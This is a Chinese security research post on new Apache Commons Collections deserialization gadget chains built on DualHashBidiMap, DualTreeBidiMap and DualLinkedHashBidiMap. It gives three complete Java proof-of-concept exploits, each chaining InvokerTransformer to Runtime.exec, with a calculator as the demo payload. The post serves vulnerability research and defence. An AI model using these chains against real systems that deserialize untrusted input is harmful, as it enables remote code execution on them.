0x0前言
=====

CC链即Apache Commons Collections Java反序列化利用链的简称，最近把CC1-CC12利用链都学习分析了一遍，收获颇多，想找找还有没有新的利用链，看到 [Java反序列化之与JDK版本无关的利用链挖掘](https://www.anquanke.com/post/id/232415 "Java反序列化之与JDK版本无关的利用链挖掘") 这篇文章讲解了使用DualHashBidiMap类来构造新利用链，文章还提到使用DualTreeBidiMap类也可以，自己来分析下

0x1分析
=====

### DualHashBidiMap

首先来看看是如何使用DualHashBidiMap类来构造新利用链的，测试POC如下：

```java
import org.apache.commons.collections.BidiMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class Demo {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"}),
                new ConstantTransformer(1)
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, "111");
        Map<String, Object> expMap = new HashMap<String, Object>();
        expMap.put("222", tiedMapEntry);

        Class clazz = Class.forName("org.apache.commons.collections.bidimap.DualHashBidiMap");
        Constructor constructor = clazz.getDeclaredConstructor(Map.class, Map.class, BidiMap.class);
        constructor.setAccessible(true);
        Object dualHashBidiMap = constructor.newInstance(expMap, null, null);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(dualHashBidiMap);

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }
}
```

利用链的触发点是在 org.apache.commons.collections.bidimap.DualHashBidiMap 类的readObject方法

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-ca6e698a6bec7cc6eba0bd518ce87396ea807322.jpg)

在readObject方法中调用了putAll方法，传入的map参数是通过反序列化得到的，看下writeObject方法，在方法中是将`this.maps[0]`进行了序列化，所以这里的map参数就是`this.maps[0]`的值

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-9e88592ce4f265b9e765ae443d298d07045468ec.png)

我们来看看`this.maps[0]` 是从哪来的，查看DualHashBidiMap类和父类的构造方法可以知道，`this.maps[0]`是通过传入的normalMap参数进行赋值，是可控的

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-f04df322946eb8701acb5e3a9d57b0f676e88f5d.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-5bb1337198f5dd964230ca9f065e3ab3cc1208c8.png)

搞清楚了map参数的来源，继续跟进下putAll方法

putAll方法定义在DualHashBidiMap类继承的抽象父类`org.apache.commons.collections.bidimap.AbstractDualBidiMap`中

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-c030e895c5e638857f3e34ab1e190643de2973e3.jpg)

在putAll方法中遍历获取传入的map中的元素，调用put方法，将key和value作为参数传入，继续跟进put方法

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-3265a258c699e46d16a0ba7e10dcc6d2e6049da4.png)

在put方法中首先使用containsKey方法分别判断了传入的key和value是否是`this.maps[0]`和`this.maps[1]`中元素的键，在前面readObject方法中可以看到`this.maps[0]`和`this.maps[1]`是被赋值为空的HashMap对象，所以这里调用的是HashMap对象的containsKey方法，跟进HashMap的containsKey方法

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-263c630e23db0a3f61fbcccf3e6fb5001bfea2ce.png)

在containsKey方法中会调用`hash(key)` 方法计算传入的key的hash，我们知道在hash方法中会调用`key.hashCode()`方法，而这里的key参数是可控的，熟悉CC6利用链的朋友应该知道，我们可以控制这里的key为TiedMapEntry对象，从而就可以完成后半本部分的利用链构造。

#### DualTreeBidiMap

接下来分析使用DualTreeBidiMap类来构造新利用链，这条链需要在Commons Collections 4.0版本下利用，原因会在后面说明

在pom.xml文件中添加Commons Collections 4依赖

```xml
<dependency>
  <groupId>org.apache.commons</groupId>
  <artifactId>commons-collections4</artifactId>
  <version>4.0</version>
</dependency>
```

触发点是在org.apache.commons.collections4.bidimap.DualTreeBidiMap类的readObject方法，同样是调用了putAll方法，并且DualTreeBidiMap类同样是继承自AbstractDualBidiMap抽象类

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-e4d65141de361a8ce039b1a5869ad36c9138db10.png)

所以直接来看put方法的定义，这里的利用点不再是containsKey方法，因为在readObject方法中`this.normalMap`和`this.reverseMap`是被赋值为空的TreeMap对象，所以无法再利用，不过在下面调用了`this.normalMap`和`this.reverseMap`对象的put方法，也就是TreeMap的put方法

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-b931ea4fdbb2124d63d75860f4fee4fef496910e.png)

我们知道在TreeMap的put方法中会调用compare方法

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-4640ad4b98254cbaada60cf8db1ada6a308cc666.png)

而在compare方法中又会调用成员变量comparator的compare方法，熟悉CC2、CC8利用链的朋友应该知道，如果能控制这里的comparator为TransformingComparator对象，就可以完成后半部分利用链的构造，因为用到了TransformingComparator类，而TransformingComparator类在Commons Collections 4.0版本下实现了Serializable接口，所以该利用链在Commons Collections 4.0版本下才可利用

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-e96dd83d1be8c12f025abd50b567ab90b20ffbea.png)

我们来看看这里的comparator是来自哪里，查看前面DualTreeBidiMap类的readObject方法就可以知道，这里的comparator是来自DualTreeBidiMap对象的成员变量comparator，是实例化TreeMap对象时传入的

而DualTreeBidiMap对象的成员变量comparator在构造方法中是通过传入的keyComparator参数进行赋值，所以是可控的

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-bfa8564d3a0113e1f6e4b486c3f80388972943aa.png)

分析完利用链，可以构造如下的测试POC：

```java
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bidimap.DualTreeBidiMap;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;

public class Demo {
    public static void main(String[] args) throws Exception{

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"}),
                new ConstantTransformer(1)
        };

        Transformer chainedTransformer = new ChainedTransformer(new ConstantTransformer(1));
        TransformingComparator comparator = new TransformingComparator(chainedTransformer);
        DualTreeBidiMap dualTreeBidiMap = new DualTreeBidiMap(comparator, comparator);
        dualTreeBidiMap.put("demo", "demo");

        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(dualTreeBidiMap);

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }
}
```

注意在代码中调用了DualTreeBidiMap对象的put方法添加元素，是因为在putAll方法中会循环遍历map中的元素，如果map中元素为空，就不会进入到while循环中执行，也就不会调用put方法了

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-94380421f8e5a9aac2cf1ed37540769c2754e605.png)

另外为了避免在调用put方法时就直接触发利用链，执行命令，所以在put方法之后利用反射修改了之前的ChainedTransformer对象的iTransformers属性

最后运行下，可以看到成功弹出了计算器

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-2d4387d139fb57409bf46b6253752734dfa1b091.png)

#### DualLinkedHashBidiMap

在分析DualTreeBidiMap的过程中，发现Commons Collections 4.0版本中新增了一个类org.apache.commons.collections4.bidimap.DualLinkedHashBidiMap

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-aac7d3d480820f295f6649ef6d5827b7bc15e0e5.png)

同样可以作为触发点来构造利用链，构造如下测试POC：

```java
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bidimap.DualLinkedHashBidiMap;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class Demo {
    public static void main(String[] args) throws Exception{

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"}),
                new ConstantTransformer(1)
        };

        Transformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        LazyMap lazyMap = LazyMap.lazyMap(innerMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "111");
        Map expMap = new HashMap();
        expMap.put("222", tiedMapEntry);

        DualLinkedHashBidiMap dualLinkedHashBidiMap = new DualLinkedHashBidiMap();
        Field field1 = dualLinkedHashBidiMap.getClass().getSuperclass().getDeclaredField("normalMap");
        field1.setAccessible(true);
        field1.set(dualLinkedHashBidiMap, expMap);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(dualLinkedHashBidiMap);

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }
}
```

注意在Commons Collections 4.0版本中LazyMap是存在变化的，不再通过decorate方法返回实例化对象，而是通过调用静态方法lazyMap返回实例化对象

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-1e40d6b64666e03444881597eae1bf0e24d83737.png)

0x2参考
=====

[Java反序列化之与JDK版本无关的利用链挖掘](https://www.anquanke.com/post/id/232415 "Java反序列化之与JDK版本无关的利用链挖掘")

0x3总结
=====

本次分析了DualHashBidiMap、DualTreeBidiMap、DualLinkedHashBidiMap类作为触发点来构造新的利用链，分析完所有的CC链就可以知道这些链是类似的，将各种可利用的节点通过不同的组合成了这些利用链，所以发现新的可利用节点就可以组合出n多利用链了。